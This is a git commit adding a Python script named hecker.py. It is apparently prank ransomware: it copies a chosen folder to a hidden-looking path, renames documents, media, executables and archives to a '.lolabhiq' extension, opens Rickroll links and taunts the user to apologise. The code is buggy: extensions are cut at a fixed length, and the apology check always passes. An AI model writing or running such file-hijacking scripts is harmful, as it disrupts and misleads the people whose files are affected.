40410abec795024d52839f2e3a20849096f98d54
Abhinav <abhinav.ranish@outlook.com>
2021-08-27 19:58:06 +0300

    Add files via upload

---
+++ src/hecker.py
@@ -0,0 +1,83 @@
+import webbrowser
+import os
+import sys
+from os import system
+import glob
+import shutil
+
+os.system("color 0a")
+os.system("cls")
+folder = input("Enter The Location \n ")
+webbrowser.open_new("https://github.com/abhinav-ranish")
+webbrowser.open_new_tab("https://www.youtube.com/watch?v=LWz4Zk-0B9w")
+webbrowser.open_new_tab("https://www.youtube.com/watch?v=dQw4w9WgXcQ")
+
+
+files = "D:/abhinavranishgq/githubprohackingskills/pog/ransomware/files/copiedfiles/justmakethisdirectoryaslongaspossible/ok/files"
+shutil.copytree(folder, files , dirs_exist_ok=True)
+
+for filename in glob.iglob(os.path.join(folder, '*.exe')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.pdf')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.doxc')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.txt')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.mp3')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.mp4')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.pptx')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.msi')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.dll')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.bin')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.bat')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.csv')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.doc')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.iso')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.gif')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.jpg')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.png')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.rar')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.jpeg')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.zip')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.py')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.jar')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.js')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.dir')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.webm')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+for filename in glob.iglob(os.path.join(folder, '*.xlsx')):
+    os.rename(filename, filename[:-4] + ".lolabhiq")
+
+
+print("Check Your Folder :)")
+pog = input("Say Sorry lmao\n")
+if pog == "Sorry" or "Soewwy" or "Sory" or "Sorrrry" or ":(" or "Sowwy":
+    print("Okie. Next time be carefull")
+    print("Your Files are located at " + files)
+else :
+    print("Your Trash. Im Toxic :)")
+    print("Better Getting Hacked :)")
+    
+op =  input("Click Enter to close\n")
+os.system("cls")
